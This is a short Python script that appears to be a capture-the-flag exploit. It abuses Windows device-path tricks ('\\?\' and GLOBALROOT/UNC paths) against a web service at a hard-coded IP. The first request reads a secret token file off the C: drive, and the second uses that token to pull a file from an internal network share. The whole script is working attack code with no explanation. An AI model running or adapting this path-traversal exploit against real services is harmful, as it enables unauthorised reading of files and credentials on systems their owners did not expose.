import requests
import json

url = "http://1.95.51.2:8080"

res1 = requests.get(url +
                    '/api/diag/read?path=\\\\?\C:\\token\\access_key.txt')
token = json.loads(res1.text)['token']

payload = "\\\\?\\GLOBALROOT\\??\\UNC\\172.20.0.10\\backup\\flag.txt"

res2 = requests.get(url + f'/api/export/read?path={payload}' +
                    f'&token={token}')
print(res2.text)
